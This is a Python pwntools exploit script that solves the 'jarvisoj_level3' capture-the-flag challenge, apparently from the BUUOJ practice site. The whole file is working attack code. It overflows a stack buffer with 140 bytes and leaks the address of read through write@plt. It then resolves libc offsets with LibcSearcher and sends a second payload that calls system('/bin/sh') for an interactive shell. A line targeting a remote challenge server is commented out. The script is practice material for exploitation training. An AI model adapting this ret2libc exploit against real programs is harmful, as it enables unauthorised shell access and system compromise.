from pwn import *
from LibcSearcher import *


def jarvisoj_level3(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_level3'):
    print('jarvisoj_level3 start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    # target = remote('node4.buuoj.cn', 28585)
    target_elf = ELF(file_name)

    vuln_func_addr = p32(target_elf.symbols['vulnerable_function'])
    write_plt = p32(target_elf.plt['write'])
    read_got = p32(target_elf.got['read'])

    pop_ret_gadget = p32(0x080482f1)  # pop ebx ; ret
    pop3_ret_gadget = p32(0x08048519)  # pop esi ; pop edi ; pop ebp ; ret

    payload_1 = b'a'*140
    # read(1, read_got, 0x8);
    payload_1 += write_plt + pop3_ret_gadget + p32(0x1) + read_got + p32(8)
    # vulnerable_function()
    payload_1 += vuln_func_addr

    # gdb.attach(target)
    target.sendlineafter('Input:\n', payload_1)
    read_addr = u32(target.recv(4))
    print(hex(read_addr))

    searcher = LibcSearcher('read', read_addr)
    libc_base = read_addr - searcher.dump('read')
    system_addr = p32(libc_base + searcher.dump('system'))
    bin_sh_addr = p32(libc_base + searcher.dump('str_bin_sh'))

    payload_2 = b'a'*140
    # system('/bin/sh')
    payload_2 += system_addr + pop_ret_gadget + bin_sh_addr
    target.sendlineafter('Input:\n', payload_2)
    target.interactive()

    print('jarvisoj_level3 end')


if __name__ == '__main__':
    jarvisoj_level3()
